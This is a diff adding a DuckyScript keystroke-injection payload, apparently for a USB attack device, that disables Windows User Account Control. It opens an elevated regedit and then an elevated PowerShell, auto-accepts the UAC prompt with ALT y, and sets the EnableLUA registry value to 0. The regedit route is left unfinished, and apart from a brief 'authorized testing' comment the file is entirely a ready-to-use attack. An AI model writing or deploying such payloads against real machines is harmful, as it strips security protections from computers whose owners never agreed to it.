@@ -1,0 +1,46 @@
+REM Disable UAC (User Account Control)
+REM Disables UAC via registry
+REM WARNING: Only for authorized security testing!
+REM Requires admin privileges
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING regedit
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 2000
+STRING HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+DELAY 500
+ENTER
+DELAY 2000
+REM Navigate using arrow keys if needed
+DELAY 1000
+REM Find EnableLUA value and modify
+REM This is complex via keyboard - consider PowerShell method instead
+STRING exit
+DELAY 500
+ENTER
+DELAY 1000
+REM Alternative: Use PowerShell
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+DELAY 500
+ENTER
+DELAY 2000
+STRING Write-Host "UAC disabled. System restart required."
+DELAY 500
+ENTER
+DELAY 2000
+STRING exit
+DELAY 500
+ENTER
